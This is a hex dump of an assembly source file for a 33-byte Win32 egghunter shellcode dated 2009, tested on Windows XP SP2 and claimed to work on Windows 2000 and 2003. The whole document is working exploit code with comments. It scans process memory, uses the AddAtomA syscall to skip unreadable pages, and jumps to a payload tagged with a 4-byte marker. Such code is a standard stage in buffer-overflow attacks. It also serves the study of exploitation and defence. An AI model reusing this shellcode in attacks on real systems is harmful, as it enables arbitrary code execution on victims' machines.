00000000  3b 20 77 69 6e 33 32 20  65 67 67 73 65 61 72 63  |; win32 eggsearc|
00000010  68 20 73 68 65 6c 6c 63  6f 64 65 2c 20 33 33 20  |h shellcode, 33 |
00000020  62 79 74 65 73 0d 0a 3b  20 74 65 73 74 65 64 20  |bytes..; tested |
00000030  6f 6e 20 77 69 6e 64 6f  77 73 20 78 70 20 73 70  |on windows xp sp|
00000040  32 2c 20 73 68 6f 75 6c  64 20 77 6f 72 6b 20 6f  |2, should work o|
00000050  6e 20 61 6c 6c 20 73 65  72 76 69 63 65 20 70 61  |n all service pa|
00000060  63 6b 73 20 6f 6e 20 77  69 6e 32 6b 2c 20 77 69  |cks on win2k, wi|
00000070  6e 20 78 70 2c 20 77 69  6e 32 6b 33 0d 0a 3b 20  |n xp, win2k3..; |
00000080  28 63 29 20 32 30 30 39  20 62 79 20 47 65 6f 72  |(c) 2009 by Geor|
00000090  67 20 27 6f 78 66 66 27  20 57 69 63 68 65 72 73  |g 'oxff' Wichers|
000000a0  6b 69 0d 0a 20 0d 0a 5b  62 69 74 73 20 33 32 5d  |ki.. ..[bits 32]|
000000b0  0d 0a 20 0d 0a 6d 61 72  6b 65 72 20 65 71 75 20  |.. ..marker equ |
000000c0  30 78 31 66 32 31 37 37  36 37 20 20 20 3b 20 27  |0x1f217767   ; '|
000000d0  67 77 21 5c 78 31 66 27  0d 0a 20 0d 0a 73 74 61  |gw!\x1f'.. ..sta|
000000e0  72 74 3a 0d 0a 20 78 6f  72 20 65 64 78 2c 20 65  |rt:.. xor edx, e|
000000f0  64 78 20 20 20 3b 20 65  64 78 20 3d 20 30 2c 20  |dx   ; edx = 0, |
00000100  70 6f 69 6e 74 65 72 20  74 6f 20 65 78 61 6d 69  |pointer to exami|
00000110  6e 65 64 20 61 64 64 72  65 73 73 0d 0a 20 0d 0a  |ned address.. ..|
00000120  61 64 64 72 65 73 73 5f  6c 6f 6f 70 3a 0d 0a 20  |address_loop:.. |
00000130  69 6e 63 20 65 64 78 20  20 20 20 3b 20 65 64 78  |inc edx    ; edx|
00000140  2b 2b 2c 20 74 72 79 20  6e 65 78 74 20 61 64 64  |++, try next add|
00000150  72 65 73 73 0d 0a 20 0d  0a 70 61 67 65 73 74 61  |ress.. ..pagesta|
00000160  72 74 5f 63 68 65 63 6b  3a 0d 0a 20 74 65 73 74  |rt_check:.. test|
00000170  20 64 78 2c 20 30 78 30  66 66 63 20 20 20 3b 20  | dx, 0x0ffc   ; |
00000180  61 72 65 20 77 65 20 77  69 74 68 69 6e 20 74 68  |are we within th|
00000190  65 20 66 69 72 73 74 20  34 20 62 79 74 65 73 20  |e first 4 bytes |
000001a0  6f 66 20 61 20 70 61 67  65 3f 0d 0a 20 6a 7a 20  |of a page?.. jz |
000001b0  61 64 64 72 65 73 73 5f  6c 6f 6f 70 20 20 20 3b  |address_loop   ;|
000001c0  20 69 66 20 73 6f 2c 20  74 72 79 20 6e 65 78 74  | if so, try next|
000001d0  20 61 64 64 72 65 73 73  20 61 73 20 70 72 65 76  | address as prev|
000001e0  69 6f 75 73 20 70 61 67  65 20 6d 69 67 68 74 20  |ious page might |
000001f0  62 65 20 75 6e 72 65 61  64 61 62 6c 65 0d 0a 20  |be unreadable.. |
00000200  20 20 20 20 3b 20 61 6e  64 20 74 68 65 20 63 6d  |    ; and the cm|
00000210  70 20 5b 65 64 78 2d 34  5d 2c 20 6d 61 72 6b 65  |p [edx-4], marke|
00000220  72 20 6d 69 67 68 74 20  72 65 73 75 6c 74 20 69  |r might result i|
00000230  6e 20 61 20 73 65 67 6d  65 6e 74 61 74 69 6f 6e  |n a segmentation|
00000240  20 66 61 75 6c 74 0d 0a  20 0d 0a 61 63 63 65 73  | fault.. ..acces|
00000250  73 5f 63 68 65 63 6b 3a  0d 0a 20 70 75 73 68 20  |s_check:.. push |
00000260  65 64 78 20 20 20 3b 20  73 61 76 65 20 61 63 72  |edx   ; save acr|
00000270  6f 73 73 20 73 79 73 63  61 6c 6c 0d 0a 20 70 75  |oss syscall.. pu|
00000280  73 68 20 62 79 74 65 20  38 20 20 20 3b 20 65 61  |sh byte 8   ; ea|
00000290  78 20 3d 20 38 2c 20 73  79 73 63 61 6c 6c 20 6e  |x = 8, syscall n|
000002a0  72 20 6f 66 20 41 64 64  41 74 6f 6d 41 0d 0a 20  |r of AddAtomA.. |
000002b0  70 6f 70 20 65 61 78 20  20 20 20 3b 20 5e 0d 0a  |pop eax    ; ^..|
000002c0  20 69 6e 74 20 30 78 32  65 20 20 20 3b 20 66 69  | int 0x2e   ; fi|
000002d0  72 65 20 73 79 73 63 61  6c 6c 20 28 65 61 78 20  |re syscall (eax |
000002e0  3d 20 38 2c 20 65 64 78  20 3d 20 70 74 72 29 0d  |= 8, edx = ptr).|
000002f0  0a 20 63 6d 70 20 61 6c  2c 20 30 78 30 35 20 20  |. cmp al, 0x05  |
00000300  20 3b 20 69 73 20 72 65  73 75 6c 74 20 30 78 63  | ; is result 0xc|
00000310  30 30 30 30 30 30 35 3f  20 28 61 20 62 69 74 20  |0000005? (a bit |
00000320  73 6c 6f 70 70 79 29 0d  0a 20 70 6f 70 20 65 64  |sloppy).. pop ed|
00000330  78 20 20 20 20 3b 0d 0a  20 0d 0a 20 6a 65 20 61  |x    ;.. .. je a|
00000340  64 64 72 65 73 73 5f 6c  6f 6f 70 20 20 20 3b 20  |ddress_loop   ; |
00000350  6a 6d 70 20 69 66 20 72  65 73 75 6c 74 20 77 61  |jmp if result wa|
00000360  73 20 30 78 63 30 30 30  30 30 30 35 0d 0a 20 0d  |s 0xc0000005.. .|
00000370  0a 65 67 67 5f 63 68 65  63 6b 3a 0d 0a 20 63 6d  |.egg_check:.. cm|
00000380  70 20 64 77 6f 72 64 20  5b 65 64 78 2d 34 5d 2c  |p dword [edx-4],|
00000390  20 6d 61 72 6b 65 72 20  3b 20 69 73 20 6f 75 72  | marker ; is our|
000003a0  20 65 67 67 20 72 69 67  68 74 20 62 65 66 6f 72  | egg right befor|
000003b0  65 20 65 78 61 6d 69 6e  65 64 20 61 64 64 72 65  |e examined addre|
000003c0  73 73 3f 0d 0a 20 6a 6e  65 20 61 64 64 72 65 73  |ss?.. jne addres|
000003d0  73 5f 6c 6f 6f 70 20 20  3b 20 69 66 20 6e 6f 74  |s_loop  ; if not|
000003e0  2c 20 74 72 79 20 6e 65  78 74 20 61 64 64 72 65  |, try next addre|
000003f0  73 73 0d 0a 20 0d 0a 65  67 67 5f 65 78 65 63 75  |ss.. ..egg_execu|
00000400  74 65 3a 0d 0a 20 69 6e  63 20 65 62 78 20 20 20  |te:.. inc ebx   |
00000410  20 3b 20 6d 61 6b 65 20  73 75 72 65 2c 20 7a 66  | ; make sure, zf|
00000420  20 69 73 20 6e 6f 74 20  73 65 74 0d 0a 20 6a 6d  | is not set.. jm|
00000430  70 20 65 64 78 20 20 20  20 3b 20 77 65 20 66 6f  |p edx    ; we fo|
00000440  75 6e 64 20 6f 75 72 20  65 67 67 20 61 74 20 5b  |und our egg at [|
00000450  65 64 78 2d 34 5d 2c 20  73 6f 20 77 65 20 63 61  |edx-4], so we ca|
00000460  6e 20 6a 6d 70 20 74 6f  20 65 64 78              |n jmp to edx|
0000046c
